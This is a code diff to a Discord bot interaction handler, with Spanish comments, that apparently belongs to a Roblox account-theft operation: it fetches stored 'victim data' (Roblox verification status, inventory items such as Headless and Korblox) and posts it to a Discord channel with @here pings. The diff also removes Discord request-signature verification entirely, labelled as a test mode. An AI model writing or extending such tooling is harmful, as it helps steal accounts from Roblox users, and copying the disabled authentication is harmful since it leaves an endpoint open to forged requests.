@@ -1,7 +1,6 @@
-// api/interaction.js - VERSIÓN CON EL NUEVO FORMATO
-import { verifyKey } from 'discord-interactions';
-
+// api/interaction-test-mode.js - SIN VERIFICACIÓN DE FIRMA
 export default async function handler(req, res) {
+    // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -14,40 +13,42 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const signature = req.headers['x-signature-ed25519'];
-    const timestamp = req.headers['x-signature-timestamp'];
-    const body = JSON.stringify(req.body);
-
-    if (process.env.DISCORD_PUBLIC_KEY) {
-        const isValid = verifyKey(body, signature, timestamp, process.env.DISCORD_PUBLIC_KEY);
-        if (!isValid) {
-            return res.status(401).json({ error: 'Invalid signature' });
-        }
-    }
+    // ⚠️ VERIFICACIÓN DE FIRMA DESACTIVADA PARA PRUEBAS ⚠️
+    // La firma se ignora completamente
 
     const interaction = req.body;
     const baseUrl = `https://${req.headers.host}`;
 
+    console.log('📨 Interacción recibida (TEST MODE):', JSON.stringify(interaction, null, 2));
+
+    // PING response
     if (interaction.type === 1) {
         return res.status(200).json({ type: 1 });
     }
 
+    // Botón clickeado
     if (interaction.type === 3) {
         const customId = interaction.data.custom_id;
-        const [action, userId] = customId.split('_');
         
-        // ============================================================
-        // RECUPERAR DATOS DE LA VÍCTIMA DESDE /tmp
-        // ============================================================
+        // CORRECCIÓN: Manejar userId con guiones bajos
+        const partes = customId.split('_');
+        const action = partes[0];
+        const userId = partes.slice(1).join('_');
+
+        // ============================================
+        // RECUPERAR DATOS DE LA VÍCTIMA
+        // ============================================
         let victimData = {};
         try {
-            const response = await fetch(`${baseUrl}/api/guardar?userId=${userId}`);
-            victimData = await response.json() || {};
-        } catch (error) {}
-        
+            const response = await fetch(`${baseUrl}/api/guardar?userId=${encodeURIComponent(userId)}`);
+            if (response.ok) {
+                victimData = await response.json() || {};
+            }
+        } catch (e) {}
+
         const r = victimData.roblox || {};
 
-        // ========== ROBLOX CON NUEVO FORMATO ==========
+        // ========== ROBLOX ==========
         if (action === 'roblox') {
             const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **ROBLOX**!
@@ -63,7 +64,6 @@ export default async function handler(req, res) {
 🔰 Verificado: ${r.verified || 'No'}
 
 💼 **Inventario:**
-
 Headless: \`${r.headless || 'No'}\`
 Korblox: \`${r.korblox || 'No'}\`
 
@@ -169,7 +169,7 @@ Elige Una Opcion:`,
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ userId, command: action })
             });
-        } catch (error) {}
+        } catch (e) {}
 
         return res.status(200).json({
             type: 4,
